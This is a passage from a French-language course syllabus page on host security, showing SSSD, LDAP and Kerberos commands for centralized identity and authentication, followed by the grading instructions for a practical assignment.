                                    <p>Couche Transport Layer Security (TLS), avec certificat pour le serveur d'identité - pour la sécurité (pas implémenté ici).</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>sssd.conf :</h4>
                            <img src="../images/configuration_sssd_client.PNG" alt="">
<pre><code>sudo cat /etc/sssd/sssd.conf</code></pre>
                            <p>En résumé, cette commande affiche la configuration de SSSD, qui gère l'authentification centralisée.</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="gestion_centralisee_identite">Gestion centralisée de l'identité :</h2>
                    <h3>Client utilisant serveur d'identité :</h3>
                    <img src="../images/client_utilisant_serveur_identite.PNG" alt="">
                    <p>Voici les commandes exécutées dans l'image précédente :</p>
<pre><code>sudo login</code></pre>
                    <p>En résumé, cette commande ouvre une session.</p>
<pre><code>id</code></pre>
                    <p>En résumé, cette commande montre l'UID/GID/groupes</p>
<pre><code>sudo cat /etc/passwd | grep john</code></pre>
<pre><code>sudo cat /etc/group | grep john</code></pre>
                    <p>En résumé, ces deux commandes vérifient la présence de l'utilisateur dans les fichiers système.</p>
                </article>
                <article>
                    <h2 id="gestion_centralisee_authentification">Gestion centralisée de l'authentification :</h2>
                    <h3>Authentification centralisée - login puis SSH sans réauthentification :</h3>
                    <img src="../images/authentification_centralisee_login_SSH_sans_reauthentification.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo login</code></pre>
<pre><code>id</code></pre>
<pre><code>ssh john@sso-service.hs.be</code></pre>
                    <p>En résumé, cette commande se connecte à la machine distante.</p>
<pre><code>id</code></pre>
<pre><code>pwd</code></pre>
                    <p>En résumé, cette commande affiche le répertoire courant.</p>
                    <h3>Authentification centralisée - "tickets" sur client :</h3>
                    <img src="../images/authentification_centralisee_tickets_client.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>kinit john</code></pre>
                    <p>En résumé, cette commande récupère un ticket Kerberos.</p>
<pre><code>klist</code></pre>
                    <p>En résumé, cette commande affiche le ticket.</p>
<pre><code>exit</code></pre>
                    <p>En résumé, cette commande ferme la session.</p>
<pre><code>klist</code></pre>
                    <p>En résumé, cette commande vérifie que le ticket a disparu.</p>
                    <h3>Authentification centralisée - Contenu de la base des "principals" de Kerberos :</h3>
                    <img src="../images/authentification_centralisee_contenu_base_principals_Kerberos.PNG" alt="">
<pre><code>sudo kadmin.local</code></pre>
                    <p>En résumé, cette commande ouvre l'administration Kerberos locale.</p>
                    <h3>Ajout d'un utilisateur :</h3>
                    <img src="../images/ajout_utilisateur_1.PNG" alt="">
<pre><code>cat ldifs/add_user1.ldif</code></pre>
                    <p>En résumé, cette commande affiche le fichier LDIF décrivant le nouvel utilisateur pour LDAP.</p>
                    <img src="../images/ajout_utilisateur_2.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>ldapadd -x -D cn=admin,dc=hs,dc=be -f ldifs/add_user1.ldif -W</code></pre>
                    <p>En résumé, commande ajoute l'utilisateur à LDAP. Voici les différentes options et leurs explications :</p>
                    <ul>
                        <li>
                            <p><span class="em">-x</span> : auth simple.</p>
                        </li>
                        <li>
                            <p><span class="em">-D</span> : DN de l'admin.</p>
                        </li>
                        <li>
                            <p><span class="em">-f</span> : fichier LDIF.</p>
                        </li>
                        <li>
                            <p><span class="em">-W</span> : demande le mot de passe de l'admin.</p>
                        </li>
                    </ul>
<pre><code>sudo kadmin.local -q "addprinc user1"</code></pre>
                    <p>En résumé, cette commande crée un utilisateur dans la base Kerberos.</p>
                    <img src="../images/ajout_utilisateur_3.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo login</code></pre>
<pre><code>id</code></pre>
<pre><code>ssh user1@sso-service.hs.be</code></pre>
<pre><code>id</code></pre>
                </article>
                <article>
                    <h2 id="evaluation_instructions_provisoires">Évaluation - instructions provisoires :</h2>
                    <h3>Objectifs / critères UE 478 :</h3>
                    <ol>
                        <li>
                            <h4>Capacités à démontrer :</h4>
                            <ul>
                                <li>
                                    <p>Mettre en pratique les principes, outils et technologies de sécurisation des hôtes.</p>
                                </li>
                                <li>
                                    <p>Expliquer et justifier les choix et solutions.</p>
                                </li>
                                <li>
                                    <p>...En mobilisant du matériel informatique pertinent (serveur, client, réseau...), éventuellement virtualisé.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Critères :</h4>
                            <ul>
                                <li>
                                    <p>Pertinence des solutions.</p>
                                </li>
                                <li>
                                    <p>Analyse des éléments sécurisés versus "coût".</p>
                                </li>
                                <li>
                                    <p>Respect timing/format.</p>
                                </li>
                                <li>
                                    <p>Cohérence de la justification.</p>
                                </li>
                                <li>
                                    <p>Clarté &amp; précision du vocabulaire.</p>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <h3>Travail pratique :</h3>
                    <h4>Contenu :</h4>
                    <ol>
                        <li>
                            <p>Description du contexte :</p>
                            <ul>
                                <li>
                                    <p>Contexte d'entreprise et infrastructure globale.</p>
                                </li>
                                <li>
                                    <p>Description des actifs à protéger, des principales menaces.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Principaux contrôles techniques mis en place :</p>
                            <ul>
                                <li>
                                    <p>Architecture globale.</p>
                                </li>
                                <li>
                                    <p>Liste des contrôles techniques mis en place.</p>
                                </li>
                                <li>
                                    <p>Justification au regard des menaces.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Démonstration de la mise en place de minimum cinq contrôles techniques :</p>
                            <ul>
                                <li>
                                    <p>(De préférence dans un environnement virtualisé).</p>
                                </li>
                                <li>
                                    <p>Configuration.</p>
                                </li>
                                <li>
                                    <p>Démonstration d'une menace potentielle.</p>
                                </li>
                                <li>
                                    <p>Démonstration du fonctionement du contrôle.</p>
                                </li>
                                <li>
                                    <p>Limites du contrôle mis en place.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Conclusions.</p>
                        </li>
                    </ol>
                    <h4>Exemple de contexte :</h4>
                    <ol>
                        <li>
                            <p>Contexte d'entreprise :</p>
                            <ul>
                                <li>
                                    <p>Site Web d'une organisation.</p>
                                </li>
                                <li>
                                    <p>Site "statique", plusieurs utilisateurs autorisés à modifier le contenu à partir de leurs ordinateurs "clients".</p>
                                </li>
                                <li>
                                    <p>Serveur derrière pare-feu.</p>
                                </li>
                                <li>
                                    <p>Nécessité de pouvoir mettre à jour le contenu &amp; la configuration "à distance".</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Actifs à protéger :</p>
                            <ul>
                                <li>
                                    <p>Contenu très important pour réputation.</p>
                                </li>
                                <li>
                                    <p>Réelle menace de piratage du contenu, ou de le rendre indisponible.</p>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <ol>
                        <li>
                            <p>Configuration à présenter :</p>
                            <ul>
                                <li>
                                    <p>Au moins 2 "types de machines" (terminal, serveur, etc.).</p>
                                </li>
                                <li>
                                    <p>Au moins 5 contrôles techniques mis en place.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Rapport :</p>
                            <ul>
                                <li>
                                    <p>Contexte d'entreprise.</p>
                                </li>
                                <li>
                                    <p>Justification des choix pour les contrôles.</p>
                                </li>
                                <li>
                                    <p>Analyse risque - menace - coût - risque résiduel.</p>
                                </li>
                                <li>
                                    <p>Discussion sur alternatives possibles.</p>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <h4>Timing ENCORE À FINALISER :</h4>
                    <ul>
                        <li>
                            <p>19/5 - Remise Contexte + Atelier.</p>
                        </li>
                        <li>
                            <p>Semaine du 26/5 (à déterminer) - Atelier.</p>
                        </li>
                        <li>
                            <p>1/6 - Remise travail.</p>
                        </li>
                        <li>
                            <p>5/6 - Défense travail.</p>
                        </li>
                    </ul>
                </article>
            <!-- fin de section -->
            </section>
        </main>
        <footer role="contentinfo">
            <div>
                <address>
                    Professeurs :
                    <a class="mail" href="mailto:olivier.choquet@vinci.be">Choquet Olivier</a>
                    <a class="mail" href="mailto:driss.vandenheede.techinfo@gmail.com">Vandenheede Driss</a>
                </address>
            </div>
            <div>
                <p>Si vous détectez une erreur, une faute d'orthographe, n'hésitez pas à envoyer un mail aux adresses juste à côté avec le nom de la page et l'erreur détectée.</p>
            </div>
            <div id="version">
                <p>Syllabus HTML</p>
                <p>Version 5.0</p>
            </div>
        </footer>
        <script src="../pre.js"></script>
    </body>
</html>